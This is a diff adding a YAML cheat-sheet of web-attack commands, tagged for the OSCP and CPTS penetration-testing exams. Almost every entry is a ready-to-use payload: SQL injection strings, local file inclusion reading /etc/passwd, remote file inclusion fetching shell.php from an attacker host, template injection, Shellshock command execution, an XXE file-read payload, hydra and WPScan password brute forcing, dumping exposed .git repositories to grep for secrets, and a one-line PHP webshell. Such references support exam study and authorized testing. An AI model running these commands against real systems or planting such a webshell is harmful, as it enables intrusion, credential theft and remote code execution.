@@ -1,0 +1,191 @@
+category: "web-attacks"
+description: "Web application attack techniques"
+commands:
+  - name: "sqli-basic-test"
+    description: "Basic SQL injection test payloads"
+    command: "curl 'http://{IP}/page?id=1' OR 1=1--'"
+    tool: "curl"
+    tags: ["web", "sqli", "injection"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Manual SQLi testing. sqlmap NOT allowed in OSCP (except for 1 machine)"
+
+  - name: "sqli-union-columns"
+    description: "UNION-based SQLi column enumeration"
+    command: "' UNION SELECT NULL,NULL,NULL-- -"
+    tool: "manual"
+    tags: ["web", "sqli", "union"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Increment NULLs until no error to find column count"
+
+  - name: "lfi-basic"
+    description: "Local File Inclusion test"
+    command: "curl 'http://{IP}/page?file=../../../../etc/passwd'"
+    tool: "curl"
+    tags: ["web", "lfi", "inclusion"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "lfi-wrappers"
+    description: "LFI with PHP filter wrapper (source code)"
+    command: "curl 'http://{IP}/page?file=php://filter/convert.base64-encode/resource=index.php'"
+    tool: "curl"
+    tags: ["web", "lfi", "php", "wrapper"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Decode base64 output to get PHP source code"
+
+  - name: "rfi-test"
+    description: "Remote File Inclusion test"
+    command: "curl 'http://{IP}/page?file=http://{LHOST}/shell.php'"
+    tool: "curl"
+    tags: ["web", "rfi", "inclusion"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "ssti-test"
+    description: "Server-Side Template Injection test"
+    command: "curl 'http://{IP}/page' -d 'name={{7*7}}'"
+    tool: "curl"
+    tags: ["web", "ssti", "template"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "If 49 appears, SSTI confirmed. Try {{config}} for Flask"
+
+  - name: "xss-test"
+    description: "Basic XSS test payload"
+    command: "<script>alert(1)</script>"
+    tool: "manual"
+    tags: ["web", "xss"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "shellshock-test"
+    description: "Shellshock CGI vulnerability test"
+    command: "curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://{IP}/cgi-bin/status"
+    tool: "curl"
+    tags: ["web", "shellshock", "cgi"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "jwt-decode"
+    description: "Decode JWT token"
+    command: "echo '{TOKEN}' | cut -d'.' -f2 | base64 -d 2>/dev/null"
+    tool: "bash"
+    tags: ["web", "jwt", "token"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "git-detect"
+    description: "Confirm .git directory is exposed (quick check)"
+    command: "curl -s -o /dev/null -w '%{http_code}' http://{IP}/.git/HEAD && curl -s http://{IP}/.git/config"
+    tool: "curl"
+    tags: ["web", "git", "recon"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "HTTP 200 on .git/HEAD confirms exposure. Check /config for remote URL and branch info."
+
+  - name: "git-dump"
+    description: "Dump exposed .git directory using git-dumper (preferred)"
+    command: "git-dumper http://{IP}/.git/ ./git-dump"
+    tool: "git-dumper"
+    tags: ["web", "git", "dump"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "pip install git-dumper — recursively reconstructs the repo from exposed objects."
+
+  - name: "git-dump-wget"
+    description: "Dump .git directory using wget when git-dumper is unavailable"
+    command: "wget --mirror -I .git http://{IP}/.git/ -P ./git-dump-wget"
+    tool: "wget"
+    tags: ["web", "git", "dump"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Fallback if git-dumper is not installed. May miss packed objects."
+
+  - name: "git-log"
+    description: "Review commit history of dumped repo"
+    command: "git -C ./git-dump log --oneline --all"
+    tool: "git"
+    tags: ["web", "git", "triage"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Look for commits mentioning credentials, config changes, or removed secrets."
+
+  - name: "git-show"
+    description: "Show changes in a specific commit"
+    command: "git -C ./git-dump show {COMMIT_HASH}"
+    tool: "git"
+    tags: ["web", "git", "triage"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Inspect diffs for deleted credentials or configuration changes."
+
+  - name: "git-grep-secrets"
+    description: "Grep dumped repo for hardcoded credentials and secrets"
+    command: "grep -rE 'password|passwd|secret|api.?key|token|private.?key|auth' ./git-dump --include='*.php' --include='*.py' --include='*.env' --include='*.config' -l"
+    tool: "grep"
+    tags: ["web", "git", "credentials", "triage"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Pipe to -l for file list first, then grep specific files for context."
+
+  - name: "git-trufflehog"
+    description: "Automated secret scanning on dumped repo"
+    command: "trufflehog filesystem ./git-dump"
+    tool: "trufflehog"
+    tags: ["web", "git", "credentials", "secrets"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Alternative: gitleaks detect -s ./git-dump --no-git"
+
+  - name: "git-stash-list"
+    description: "Check for stashed changes in dumped repo (may contain secrets)"
+    command: "git -C ./git-dump stash list && git -C ./git-dump stash show -p"
+    tool: "git"
+    tags: ["web", "git", "triage"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Stash often holds work-in-progress credentials or config that was never committed."
+
+  - name: "hydra-post-form"
+    description: "Hydra brute force login (POST)"
+    command: "hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {IP} http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\""
+    tool: "hydra"
+    tags: ["web", "bruteforce", "hydra", "post"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "wpscan-enum"
+    description: "WPScan full enumeration"
+    command: "wpscan --url http://{IP} --enumerate u,p,t --plugins-detection aggressive"
+    tool: "wpscan"
+    tags: ["web", "wordpress", "enum"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "wpscan-brute"
+    description: "WPScan password brute force"
+    command: "wpscan --url http://{IP} --passwords /usr/share/wordlists/rockyou.txt --usernames admin"
+    tool: "wpscan"
+    tags: ["web", "wordpress", "bruteforce"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "xxe-basic"
+    description: "Basic XXE injection payload"
+    command: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+    tool: "manual"
+    tags: ["web", "xxe", "xml"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+
+  - name: "upload-webshell-php"
+    description: "Simple PHP webshell"
+    command: "<?php system($_GET['cmd']); ?>"
+    tool: "manual"
+    tags: ["web", "webshell", "php", "upload"]
+    os: "any"
+    exam: ["oscp", "cpts"]
+    notes: "Access: http://target/shell.php?cmd=id"
